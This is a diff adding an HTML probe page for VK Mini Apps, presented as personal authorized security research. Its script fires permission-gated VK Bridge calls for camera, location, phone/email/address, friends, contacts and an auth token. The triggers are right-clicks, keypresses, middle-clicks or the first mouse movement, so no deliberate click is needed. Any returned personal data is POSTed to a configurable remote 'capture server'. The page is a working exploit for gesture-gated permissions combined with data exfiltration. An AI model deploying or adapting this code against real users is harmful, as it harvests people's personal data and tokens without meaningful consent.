@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>VK Mini App Bridge Test</title>
+<script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js" defer></script>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f4f4f5;color:#000;min-height:100vh;padding:16px}
+.card{background:#fff;border-radius:14px;padding:22px 20px;max-width:460px;margin:0 auto 14px;box-shadow:0 1px 3px rgba(0,0,0,.08)}
+h2{font-size:17px;font-weight:600;color:#000;margin-bottom:6px}
+.sub{font-size:12px;color:#818c99;margin-bottom:18px;line-height:1.5}
+.pill{display:inline-block;font-size:10px;padding:2px 8px;border-radius:8px;font-weight:600;margin-left:6px;vertical-align:middle}
+.p-ok{background:#e3f8e9;color:#2eb851}.p-run{background:#e6f2ff;color:#0077ff}.p-fail{background:#ffe4e4;color:#e64646}.p-wait{background:#eee;color:#818c99}.p-block{background:#fff2e0;color:#ff8a00}
+.row{display:flex;align-items:center;justify-content:space-between;padding:10px 0;border-bottom:1px solid #f0f0f0}
+.row:last-child{border-bottom:none}
+.rname{font-size:13px;color:#000;font-weight:500}
+.rdesc{font-size:11px;color:#818c99;margin-top:3px;line-height:1.4}
+.btn{border:none;border-radius:8px;padding:7px 14px;font-size:12px;font-weight:600;cursor:pointer;margin-left:8px;min-width:70px}
+.btn-go{background:#0077ff;color:#fff}
+.trigger-box{background:#f7f8fa;border:2px dashed #0077ff;border-radius:10px;padding:22px;text-align:center;cursor:pointer;user-select:none;margin:14px 0}
+.trigger-box.active{border-color:#2eb851;background:#e3f8e9}
+.trigger-label{font-size:14px;color:#818c99;font-weight:500}
+.trigger-hint{font-size:11px;color:#b0b8c1;margin-top:4px}
+#log{background:#0d1117;border-radius:8px;padding:10px;font-family:monospace;font-size:11px;color:#aaa;max-height:320px;overflow-y:auto;margin-top:12px}
+#log p{margin:2px 0;line-height:1.4}
+.l-ok{color:#4caf50}.l-warn{color:#ffa726}.l-err{color:#ef5350}.l-crit{color:#ff5252;font-weight:700}
+.version-box{background:#f7f8fa;border-radius:8px;padding:10px 14px;font-size:11px;font-family:monospace;color:#818c99;margin-bottom:14px}
+.srv-input{width:100%;background:#f7f8fa;border:1px solid #e5e7eb;border-radius:8px;padding:8px 10px;color:#000;font-size:12px;margin-bottom:14px;font-family:monospace}
+</style>
+</head>
+<body>
+
+<div class="card">
+  <h2>VK Mini App Bridge Test</h2>
+  <p class="sub">Personal authorized security research — VK Bridge gesture-seed / permission-relay probe.
+    Not affiliated with VK. Testing against own account only.</p>
+  <div class="version-box" id="ver-box">Detecting environment…</div>
+
+  <label style="font-size:11px;color:#818c99">Capture server URL (results POST target):</label>
+  <input class="srv-input" id="srv-input" placeholder="https://your-capture-server/log" value="">
+
+  <div class="row"><div>
+    <div class="rname">Battery under test <span class="pill p-wait" id="s-battery">PENDING</span></div>
+    <div class="rdesc">VKWebAppOpenCodeReader (camera), VKWebAppGetGeodata (location), VKWebAppGetPersonalCard
+      (phone/email/address), VKWebAppGetFriends, VKWebAppOpenContacts, VKWebAppFlashGetInfo, VKWebAppGetAuthToken —
+      each fired synchronously inside the seeding event handler.</div>
+  </div></div>
+
+  <div class="row">
+    <div>
+      <div class="rname">G1 — Right-click seed <span class="pill p-wait" id="s-g1">WAIT</span></div>
+      <div class="rdesc">contextmenu event → fires full VK Bridge battery synchronously</div>
+    </div>
+  </div>
+  <div class="trigger-box" id="box-g1" oncontextmenu="seedG1(event)">
+    <div class="trigger-label">Right-click here</div>
+    <div class="trigger-hint">Tap and hold on mobile · Right-click on desktop</div>
+  </div>
+
+  <div class="row">
+    <div>
+      <div class="rname">G2 — Keypress seed <span class="pill p-wait" id="s-g2">WAIT</span></div>
+      <div class="rdesc">keydown event → fires full VK Bridge battery synchronously</div>
+    </div>
+  </div>
+  <input id="key-input" placeholder="Type anything…"
+    style="width:100%;background:#f7f8fa;border:1px solid #e5e7eb;border-radius:8px;padding:10px 12px;color:#000;font-size:14px;margin:8px 0 14px"
+    onkeydown="seedG2(event)" autocomplete="off">
+
+  <div class="row">
+    <div>
+      <div class="rname">G3 — Click baseline <span class="pill p-wait" id="s-g3">WAIT</span></div>
+      <div class="rdesc">Real click — positive control</div>
+    </div>
+    <button class="btn btn-go" onclick="seedG3(event)" style="font-size:13px;padding:10px 16px">Run</button>
+  </div>
+
+  <div class="row">
+    <div>
+      <div class="rname">G4 — Pointer move seed <span class="pill p-run" id="s-g4">ARMED</span></div>
+      <div class="rdesc">First mousemove/pointermove over the page → fires full VK Bridge battery</div>
+    </div>
+  </div>
+
+  <div class="row">
+    <div>
+      <div class="rname">G5 — Middle-click seed <span class="pill p-wait" id="s-g5">WAIT</span></div>
+      <div class="rdesc">auxclick event → fires full VK Bridge battery synchronously</div>
+    </div>
+  </div>
+  <div class="trigger-box" id="box-g5" onauxclick="seedG5(event)">
+    <div class="trigger-label">Middle-click here</div>
+    <div class="trigger-hint">auxclick event — middle mouse button</div>
+  </div>
+
+  <div id="log"></div>
+</div>
+
+<script>
+function getSrv(){
+  const qs = (new URLSearchParams(location.search)).get('srv');
+  const stored = localStorage.getItem('vk_probe_srv');
+  const val = qs || stored || '';
+  document.getElementById('srv-input').value = val;
+  return val;
+}
+let SRV = getSrv();
+document.getElementById('srv-input').addEventListener('change', (e) => {
+  SRV = e.target.value.replace(/\/$/, '');
+  localStorage.setItem('vk_probe_srv', SRV);
+  lg('Capture server set to: ' + SRV, 'warn');
+});
+const VK_APP_ID = (new URLSearchParams(location.search)).get('vk_app_id') || '54753486';
+
+function ts(){ return new Date().toTimeString().slice(0,8); }
+function lg(msg, cls){
+  const d = document.getElementById('log');
+  const p = document.createElement('p');
+  if(cls) p.className = 'l-' + cls;
+  p.textContent = '[' + ts() + '] ' + msg;
+  d.appendChild(p); d.scrollTop = d.scrollHeight;
+}
+function pill(id, txt, cls){
+  const e = document.getElementById(id);
+  if(!e) return;
+  e.textContent = txt; e.className = 'pill ' + cls;
+}
+async function post(type, data){
+  lg(`[log] ${type}: ${JSON.stringify(data).slice(0,150)}`, 'warn');
+  if(!SRV) return;
+  try{
+    await fetch(SRV + '?type=' + type, {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({...data, _ts: Date.now(), ua: navigator.userAgent})
+    });
+  }catch(e){}
+}
+
+function detectEnv(){
+  const ua = navigator.userAgent;
+  const vb = document.getElementById('ver-box');
+  const hasBridge = !!window.vkBridge;
+  vb.innerHTML = `UA: <b>${ua.slice(0,70)}</b><br>vkBridge loaded: ${hasBridge} · in iframe: ${window.self !== window.top}`;
+  post('VK_ENV', {
+    ua, hasBridge, inIframe: window.self !== window.top,
+    referrer: document.referrer, origin: location.origin, href: location.href
+  });
+}
+
+async function vkInit(){
+  try{
+    if(!window.vkBridge){ lg('vkBridge script not loaded yet — retrying…', 'warn'); return false; }
+    await window.vkBridge.send('VKWebAppInit');
+    lg('VKWebAppInit: OK', 'ok');
+    post('VK_INIT_OK', {});
+    return true;
+  }catch(e){
+    lg(`VKWebAppInit: ${e?.error_type || e?.name || 'error'} — ${JSON.stringify(e).slice(0,200)}`, 'err');
+    post('VK_INIT_FAIL', {error: JSON.stringify(e).slice(0,300)});
+    return false;
+  }
+}
+
+async function runBattery(label){
+  pill('s-'+label.toLowerCase(), 'FIRING', 'p-run');
+  lg(`${label}: firing VK Bridge battery…`, 'warn');
+  post('VK_BATTERY_START', { label });
+
+  const results = {};
+  const calls = [
+    ['camera_qr',      'VKWebAppOpenCodeReader', {}],
+    ['geolocation',    'VKWebAppGetGeodata', {}],
+    ['personal_card',  'VKWebAppGetPersonalCard', { type: ['phone','email','address','work_info'] }],
+    ['friends',        'VKWebAppGetFriends', { multi: true }],
+    ['contacts',       'VKWebAppOpenContacts', {}],
+    ['flash',          'VKWebAppFlashGetInfo', {}],
+    ['auth_token',     'VKWebAppGetAuthToken', { app_id: Number(VK_APP_ID), scope: 'friends' }],
+  ];
+
+  for(const [key, method, params] of calls){
+    const t0 = Date.now();
+    try{
+      const data = await window.vkBridge.send(method, params);
+      const ms = Date.now() - t0;
+      results[key] = { ok: true, ms };
+      lg(`${label}/${method}: OK (${ms}ms) — ${JSON.stringify(data).slice(0,150)}`, 'crit');
+      post('VK_HIT', {
+        label, api: method, elapsed_ms: ms, result: JSON.stringify(data).slice(0,500),
+        severity: 'CRITICAL', finding: `${method} succeeded after ${label} gesture seed`
+      });
+    }catch(e){
+      const ms = Date.now() - t0;
+      const errStr = typeof e === 'object' ? JSON.stringify(e).slice(0,200) : String(e);
+      results[key] = { ok: false, ms, err: errStr };
+      post('VK_FAIL', { label, api: method, elapsed_ms: ms, error: errStr });
+    }
+  }
+
+  const hits = Object.entries(results).filter(([,v])=>v.ok).map(([k])=>k);
+  pill('s-'+label.toLowerCase(), hits.length ? `${hits.length} HIT` : 'blocked', hits.length ? 'p-ok' : 'p-block');
+  lg(`${label}: battery done — ${hits.length}/${Object.keys(results).length} succeeded: ${hits.join(', ')||'none'}`, hits.length?'crit':'warn');
+  post('VK_BATTERY_DONE', {label, results});
+}
+
+function seedG1(e){
+  e.preventDefault(); e.stopPropagation();
+  document.getElementById('box-g1').classList.add('active');
+  post('VK_SEED', {label:'G1', event:'contextmenu'});
+  runBattery('G1');
+}
+let g2Fired=false;
+function seedG2(e){
+  if(g2Fired) return; g2Fired=true;
+  post('VK_SEED', {label:'G2', event:'keydown', key:e.key});
+  runBattery('G2');
+}
+function seedG3(e){
+  post('VK_SEED', {label:'G3', event:'click'});
+  runBattery('G3');
+}
+let g4Fired=false;
+document.addEventListener('pointermove', function onMove(e){
+  if(g4Fired) return; g4Fired=true;
+  document.removeEventListener('pointermove', onMove);
+  post('VK_SEED', {label:'G4', event:'pointermove', x:e.clientX, y:e.clientY});
+  runBattery('G4');
+});
+document.getElementById('box-g5').addEventListener('auxclick', function(e){
+  e.preventDefault();
+  post('VK_SEED', {label:'G5', event:'auxclick', button:e.button});
+  runBattery('G5');
+});
+
+async function boot(){
+  detectEnv();
+  let tries = 0;
+  while(!window.vkBridge && tries < 20){ await new Promise(r=>setTimeout(r,150)); tries++; }
+  detectEnv();
+  const ok = await vkInit();
+  lg('G4 ARMED — first mouse movement fires the full VK Bridge battery', 'crit');
+  lg('G1/G5: right-click or middle-click the boxes; G2: type in the field; G3: click Run', 'warn');
+  if(!ok) lg('vkBridge.send(VKWebAppInit) did not resolve OK — check the capture-server URL field above is set if you want remote logging; the on-page log always works regardless', 'err');
+}
+boot();
+</script>
+</body>
+</html>
